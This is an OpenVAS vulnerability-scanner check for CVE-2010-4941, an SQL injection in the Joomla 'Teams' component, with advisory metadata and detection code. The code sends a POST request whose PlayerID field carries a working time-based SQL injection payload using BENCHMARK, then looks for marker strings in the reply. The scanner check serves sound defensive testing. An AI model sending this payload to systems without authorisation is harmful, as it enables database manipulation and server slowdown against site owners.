##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_teams_sql_inj_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Joomla 'Teams' Component SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let attackers to manipulate SQL
queries by injecting arbitrary SQL code.

Impact Level: Application.";

tag_affected = "Joomla Team Component version 1_1028_100809_1711";

tag_insight = "Input passed via the 'PlayerID' parameter to 'index.php' is not
properly sanitised before being used in SQL queries.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla with Teams component and is prone to
SQL injection vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802189");
  script_version("$Revision: 9351 $");
  script_cve_id("CVE-2010-4941");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-11-09 13:02:45 +0530 (Wed, 09 Nov 2011)");
  script_name("Joomla 'Teams' Component SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40933");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14598/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/512974/100/0/threaded");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:joomlaPort)){
  exit(0);
}

## Get the dir from KB
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Try an exploit
filename = string(joomlaDir + "/index.php");
host = get_host_name();
postData = "FirstName=OpenVAS-SQL-Test&LastName=SecPod&Notes=sds&TeamNames" +
           "[1]=on&UniformNumber[1]=1&Active=Y&cid[]=&PlayerID=-1 OR (SELECT" +
           "(IF(0x41=0x41,BENCHMARK(99999999,NULL),NULL)))&option=com_teams&" +
           "task=save&controller=player";

## Construct post request
sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n\r\n",
                postData);
rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);

## Confirm the exploit
if("OpenVAS-SQL-Test" >< rcvRes && "SecPod" >< rcvRes){
  security_message(joomlaPort);
}
